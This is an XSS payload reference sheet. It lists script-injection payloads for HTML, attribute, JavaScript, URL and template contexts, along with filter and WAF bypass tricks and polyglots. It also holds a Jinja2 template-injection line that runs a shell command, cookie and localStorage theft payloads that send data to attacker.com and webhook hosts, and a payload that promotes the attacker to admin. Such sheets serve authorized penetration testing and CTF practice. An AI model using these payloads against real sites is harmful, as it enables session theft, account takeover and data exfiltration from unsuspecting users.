# XSS — Payloads Reference

---

## Quick Reference — By Context

| Context | First Payload to Try |
|---------|-------------------|
| HTML body | `<img src=x onerror=alert(1)>` |
| Double-quoted attribute | `" onmouseover="alert(1)` |
| Single-quoted attribute | `' onmouseover='alert(1)` |
| Unquoted attribute | `onmouseover=alert(1) x=` |
| JS double-quoted string | `";alert(1);//` |
| JS single-quoted string | `';alert(1);//` |
| JS template literal | `${alert(1)}` |
| URL / href | `javascript:alert(1)` |
| CSS | `red}</style><script>alert(1)</script>` |
| Angular template | `{{constructor.constructor('alert(1)')()}}` |
| Vue template | `{{constructor.constructor('alert(1)')()}}` |

---

## Confirmation Payloads

```html
<!-- Prove execution and gather context -->
<script>alert(document.domain)</script>
<img src=x onerror="alert(document.domain)">
<svg onload="alert(document.domain)">

<!-- Show cookies -->
<script>alert(document.cookie)</script>
<img src=x onerror="alert(document.cookie)">

<!-- Show origin -->
<script>alert(window.origin)</script>

<!-- Visual page change (no popup) -->
<script>document.title='XSS'</script>
<script>document.body.style.background='red'</script>
```

---

## HTML Body Payloads

```html
<!-- Script tag -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script src="https://attacker.com/xss.js"></script>

<!-- Image tag -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror=alert(document.cookie)>
<img src="x" onerror="alert(1)">
<img/src=x/onerror=alert(1)>
<IMG SRC=x ONERROR=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributeName=x>

<!-- Body -->
<body onload=alert(1)>
<body onpageshow=alert(1)>

<!-- Input (autofocus) -->
<input autofocus onfocus=alert(1)>
<input autofocus onfocus="alert(1)">
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- Details/summary (no click needed with open) -->
<details open ontoggle=alert(1)>
<details open ontoggle="alert(1)"><summary>x</summary></details>

<!-- Video/audio -->
<video src=1 onerror=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>
<audio src=x onerror=alert(1)>
<audio autoplay oncanplay=alert(1)><source src=x></audio>

<!-- iFrame -->
<iframe src="javascript:alert(1)">
<iframe onload=alert(1) src="data:text/html,x">
<iframe srcdoc="<script>alert(1)</script>">

<!-- Object / embed -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

<!-- Marquee -->
<marquee onstart=alert(1)>XSS</marquee>
<marquee loop=1 width=0 onfinish=alert(1)>x</marquee>

<!-- Form -->
<form action="javascript:alert(1)"><input type=submit>
<button formaction="javascript:alert(1)">click</button>

<!-- Meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- Link -->
<link rel=stylesheet href="data:text/css,*{background:url(javascript:alert(1))}">

<!-- Table events -->
<table background="javascript:alert(1)">
<td background="javascript:alert(1)">
```

---

## Attribute Context Payloads

### Breaking Out of Double Quotes

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onload="alert(1)
" onerror="alert(1)
"autofocus onfocus="alert(1)
" tabindex=1 onfocus="alert(1)
```

### Breaking Out of Single Quotes

```html
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>
' onmouseover='alert(1)
' onfocus='alert(1)' autofocus='
```

### Breaking Out of Unquoted Attribute

```html
onmouseover=alert(1) x=
onfocus=alert(1) autofocus x=
><script>alert(1)</script>
/><script>alert(1)</script>
```

### Staying Inside Attribute (Event Injection)

```html
<!-- When you can add attributes but can't break the tag -->
onmouseover=alert(1)
onmouseenter=alert(1)
onclick=alert(1)
onfocus=alert(1) autofocus
onload=alert(1)
onerror=alert(1)
```

### href / src Attribute

```html
javascript:alert(1)
javascript:alert(document.cookie)
JaVaScRiPt:alert(1)
JAVASCRIPT:alert(1)
&#106;avascript:alert(1)
javascript&#58;alert(1)
javascript&#x3A;alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:alert(1)         <!-- IE only -->
```

---

## JavaScript String Context Payloads

### Double-Quoted String

```javascript
";alert(1);//
"-alert(1)-"
\";alert(1);//
"+alert(1)+"
");alert(1);//
</script><script>alert(1)</script>
```

### Single-Quoted String

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
'+alert(1)+'
');alert(1);//
```

### Template Literal

```javascript
${alert(1)}
${fetch('//attacker.com/?c='+document.cookie)}
`${alert(1)}`
```

### Breaking Out of JS Block

```html
</script><script>alert(1)</script>
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

### Inside JSON / Object

```javascript
// Input lands in: var data = {"name":"INPUT"};
","x":"};alert(1);//
"\";alert(1);//
```

---

## URL / Redirect Payloads

```javascript
javascript:alert(1)
javascript:alert(document.cookie)
javascript:void(fetch('//attacker.com/?c='+document.cookie))

// Encoded
javascript%3Aalert(1)
%6Aavascript:alert(1)
&#106;avascript:alert(1)
java&#x09;script:alert(1)    // tab in protocol
java&#x0A;script:alert(1)    // newline in protocol
java&#x0D;script:alert(1)    // carriage return

// Data URI
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

// vbscript (IE)
vbscript:alert(1)
```

---

## Filter Evasion Payloads

### alert() Alternatives

```javascript
alert(1)
confirm(1)
prompt(1)
print()
console.log(1)
window.alert(1)
top.alert(1)
parent.alert(1)
self.alert(1)

// When parentheses blocked:
alert`1`
alert.call(null,1)
alert.apply(null,[1])
[1].find(alert)
[1].forEach(alert)
window['alert'](1)
(alert)(1)
throw alert(1)

// When 'alert' keyword blocked:
top['al'+'ert'](1)
top['\x61lert'](1)
top['\x61\x6c\x65\x72\x74'](1)
eval('ale'+'rt(1)')
eval(atob('YWxlcnQoMSk='))    // base64: alert(1)
setTimeout('alert(1)')
setInterval('alert(1)',0)
new Function('alert(1)')()
```

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<ImG sRc=x OnErRoR=alert(1)>
```

### Whitespace / Separator Tricks

```html
<!-- Tab between tag and attribute -->
<img	src=x	onerror=alert(1)>

<!-- Newline -->
<img
src=x
onerror=alert(1)>

<!-- Slash separator -->
<img/src=x/onerror=alert(1)>

<!-- Null byte (some parsers) -->
<scri\x00pt>alert(1)</scri\x00pt>
```

### Comment Insertion

```html
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<img <!----> src=x onerror=alert(1)>
```

### HTML Entity Encoding

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

### Double / Triple Encoding

```html
<!-- URL encode once -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- URL encode twice -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- HTML entity + URL -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

---

## Polyglot Payloads

Work across multiple contexts simultaneously:

```javascript
// Classic polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Shorter polyglot
">'><img src=x onerror=alert(1)>

// JS + HTML polyglot
"onmouseover="alert(1)"<script>alert(1)</script>

// Attribute + script polyglot  
" onload="alert(1)"><script>alert(1)</script><"

// Multi-context
</script></style></textarea><img src=x onerror=alert(1)>

// URL + HTML polyglot
javascript://comment%0aalert(1)
```

---

## Framework-Specific Payloads

### AngularJS (any version)

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- Version-specific -->
<!-- AngularJS 1.0.1 - 1.1.5 -->
{{constructor.constructor('alert(1)')()}}

<!-- AngularJS sandbox escape (1.x) -->
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

### Vue.js

```html
{{constructor.constructor('alert(1)')()}}
<div v-html="'<img src=x onerror=alert(1)>'"></div>

<!-- Vue 3 template -->
{{$emit.constructor('alert(1)')()}}
```

### React

```jsx
// React escapes output by default — XSS via dangerouslySetInnerHTML
dangerouslySetInnerHTML={{__html: userInput}}

// React XSS via href
<a href={userInput}>click</a>  // if userInput = "javascript:alert(1)"

// React XSS via eval-like constructs  
new Function(userInput)()
```

### Handlebars

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "alert(1)"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Jinja2 / Twig (SSTI → XSS)

```
{{''.__class__.__mro__[1].__subclasses__()}}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}
```

---

## Cookie / Data Exfiltration Payloads

```html
<!-- Image beacon -->
<img src=x onerror="new Image().src='//attacker.com/?c='+document.cookie">

<!-- Fetch -->
<script>fetch('//attacker.com/?c='+encodeURIComponent(document.cookie))</script>
<img src=x onerror="fetch('//attacker.com/?c='+document.cookie)">

<!-- XHR -->
<script>
var x=new XMLHttpRequest();
x.open('GET','//attacker.com/?c='+document.cookie);
x.send();
</script>

<!-- Location redirect -->
<script>location='//attacker.com/?c='+document.cookie</script>

<!-- localStorage dump -->
<script>fetch('//attacker.com/?l='+JSON.stringify(localStorage))</script>

<!-- Everything -->
<script>
fetch('//attacker.com/?'+new URLSearchParams({
    c:document.cookie,
    l:JSON.stringify({...localStorage}),
    s:JSON.stringify({...sessionStorage}),
    u:location.href
}))
</script>

<!-- Base64 encoded (avoids WAF on cookie values) -->
<script>fetch('//attacker.com/?d='+btoa(document.cookie))</script>

<!-- Compact no-space version -->
<img src=x onerror="fetch('//attacker.com/?c='+btoa(document.cookie))">
```

---

## Blind XSS Payloads

```html
<!-- XSSHunter -->
"><script src=//xss.report/YOUR-ID></script>
'><script src=//xss.report/YOUR-ID></script>
<img src=x onerror="var s=document.createElement('script');s.src='//xss.report/YOUR-ID';document.body.appendChild(s)">

<!-- Burp Collaborator -->
<script>fetch('//YOUR-ID.burpcollaborator.net/?c='+document.cookie)</script>
<img src=x onerror="new Image().src='//YOUR-ID.burpcollaborator.net/?c='+document.cookie">

<!-- webhook.site -->
<script>fetch('https://webhook.site/YOUR-UUID?c='+document.cookie)</script>

<!-- Manual — exfiltrates DOM context -->
<script>
fetch('//attacker.com/blind?'+new URLSearchParams({
    cookie: document.cookie,
    url: location.href,
    title: document.title,
    dom: document.body.innerHTML.substring(0,500)
}));
</script>
```

---

## WAF Bypass Payloads

```html
<!-- Mixed case -->
<iMg sRc=x OnErRoR=alert(1)>

<!-- Slash separator -->
<img/src=x/onerror=alert(1)>

<!-- Tab in attribute name -->
<img src=x	onerror=alert(1)>

<!-- Newline in tag -->
<img
src=x
onerror=alert(1)>

<!-- Null byte -->
<img src=\x00x onerror=alert(1)>

<!-- Comment break -->
<img src="x" o<!---->nerror="alert(1)">

<!-- Double URL encode -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Unicode -->
<img src=x onerror=\u0061lert(1)>

<!-- HTML entity in attribute -->
<img src=x onerror="&#97;lert(1)">

<!-- Extraneous open angle bracket -->
<<script>alert(1)</script>
<</script><script>alert(1)</script>

<!-- SVG alternate -->
<svg/onload=alert(1)>
<svg onload=alert&lpar;1&rpar;>

<!-- data: URI bypass -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## CTF-Specific Payloads

```html
<!-- Shortest possible payloads -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- No parentheses -->
<img src=x onerror=alert`1`>
<svg onload=alert`document.cookie`>

<!-- No spaces -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- No letters (pure symbols) -->
<img src=_ onerror=alert(1)>

<!-- When only href works -->
<a href=javascript:alert(1)>x</a>

<!-- Steal cookie to webhook -->
<img src=x onerror="fetch('//webhook.site/YOUR-UUID?c='+document.cookie)">

<!-- Admin panel XSS → promote self -->
<script>fetch('/admin/promote',{method:'POST',body:'user=ATTACKER_ID&role=admin',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include'})</script>

<!-- DOM XSS via hash -->
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>

<!-- DOM XSS via search param -->
?name=<img src=x onerror=alert(1)>
?q=<svg onload=alert(1)>
```

---

## Key Takeaways

- ✅ Always identify context first — HTML body, attribute, JS string, URL, or CSS — wrong context = payload doesn't fire
- ✅ `<img src=x onerror=alert(1)>` is the most universal single payload — works in HTML body and breaks out of most attribute contexts
- ✅ `javascript:alert(1)` is for href/src/action contexts only — not raw HTML body
- ✅ When `alert` is blocked → `confirm`, `prompt`, or `alert\`1\`` (template literal)
- ✅ When `<script>` is filtered → switch to event handler payloads (`onerror`, `onload`, `onfocus`)
- ✅ Polyglots test multiple contexts at once — use them when you're not sure of the injection context